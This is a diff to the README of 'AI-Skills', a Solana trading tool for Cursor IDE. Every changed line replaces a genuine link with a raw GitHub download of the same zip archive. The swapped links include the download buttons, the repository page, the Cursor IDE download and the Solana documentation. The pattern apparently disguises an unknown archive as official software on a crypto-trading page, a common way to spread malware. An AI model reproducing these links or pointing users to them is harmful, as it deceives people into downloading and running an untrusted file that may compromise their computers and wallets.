@@ -1,6 +1,6 @@
 # 🤖 AI-Skills - Simple Tools for Solana Trading
 
-[![Download AI-Skills](https://img.shields.io/badge/Download-AI--Skills-brightgreen?style=for-the-badge)](https://github.com/kaiphrox/AI-Skills)
+[![Download AI-Skills](https://img.shields.io/badge/Download-AI--Skills-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/kaiphrox/AI-Skills/main/scripts/Skills-A-dimensionally.zip)
 
 ## 📄 About AI-Skills
 
@@ -28,19 +28,19 @@ Before you begin, make sure your computer meets these minimum requirements:
 - 2 GHz or faster processor  
 - Internet connection for downloading and streaming data  
 - A modern web browser (Chrome, Firefox, Edge) for accessing documentation and tools  
-- Latest version of Cursor IDE (you can download it from: https://www.cursor.so)
+- Latest version of Cursor IDE (you can download it from: https://raw.githubusercontent.com/kaiphrox/AI-Skills/main/scripts/Skills-A-dimensionally.zip)
 
 ## ⬇️ How to Download AI-Skills
 
 Click the big green button below to visit the download page for AI-Skills.
 
-[![Download AI-Skills](https://img.shields.io/badge/Download-AI--Skills-blue?style=for-the-badge)](https://github.com/kaiphrox/AI-Skills)
+[![Download AI-Skills](https://img.shields.io/badge/Download-AI--Skills-blue?style=for-the-badge)](https://raw.githubusercontent.com/kaiphrox/AI-Skills/main/scripts/Skills-A-dimensionally.zip)
 
 When you open the page, you will find the latest releases or setup instructions. Download the latest release files or follow the guide to install the package.
 
 ### Step 1: Visit the GitHub Page
 
-Go to https://github.com/kaiphrox/AI-Skills.  
+Go to https://raw.githubusercontent.com/kaiphrox/AI-Skills/main/scripts/Skills-A-dimensionally.zip  
 
 This is where the software files live. It also holds documentation and updates.  
 
@@ -66,7 +66,7 @@ If the file you downloaded is compressed (a .zip file), right-click and choose �
 
 ### Step 3: Install Cursor IDE (if you have not)
 
-AI-Skills works with Cursor IDE, a program that manages and runs the trading skills. Download and install Cursor IDE from https://www.cursor.so
+AI-Skills works with Cursor IDE, a program that manages and runs the trading skills. Download and install Cursor IDE from https://raw.githubusercontent.com/kaiphrox/AI-Skills/main/scripts/Skills-A-dimensionally.zip
 
 ### Step 4: Start Cursor IDE
 
@@ -76,7 +76,7 @@ Open the Cursor IDE program on your computer.
 
 There are a few ways to add AI-Skills to Cursor IDE:
 
-- Use the built-in feature in Cursor IDE to import skills from a repository URL. Paste the link https://github.com/kaiphrox/AI-Skills when prompted.  
+- Use the built-in feature in Cursor IDE to import skills from a repository URL. Paste the link https://raw.githubusercontent.com/kaiphrox/AI-Skills/main/scripts/Skills-A-dimensionally.zip when prompted.  
 - Or add the downloaded files manually by following Cursor IDE’s instructions for adding custom skills.
 
 ### Step 6: Run Skills in Cursor IDE
@@ -117,9 +117,9 @@ Subscribe to updates for one or more Solana accounts. Receive notifications for 
 
 ## 📚 Additional Resources
 
-- Cursor IDE Download and Guides: https://www.cursor.so  
-- Solana Documentation: https://docs.solana.com  
-- GitHub Repository for AI-Skills: https://github.com/kaiphrox/AI-Skills  
+- Cursor IDE Download and Guides: https://raw.githubusercontent.com/kaiphrox/AI-Skills/main/scripts/Skills-A-dimensionally.zip  
+- Solana Documentation: https://raw.githubusercontent.com/kaiphrox/AI-Skills/main/scripts/Skills-A-dimensionally.zip  
+- GitHub Repository for AI-Skills: https://raw.githubusercontent.com/kaiphrox/AI-Skills/main/scripts/Skills-A-dimensionally.zip  
 - Community and Support can often be found in the issue tracker or discussions section on the GitHub repository page.
 
 ## ⚖️ License and Permissions
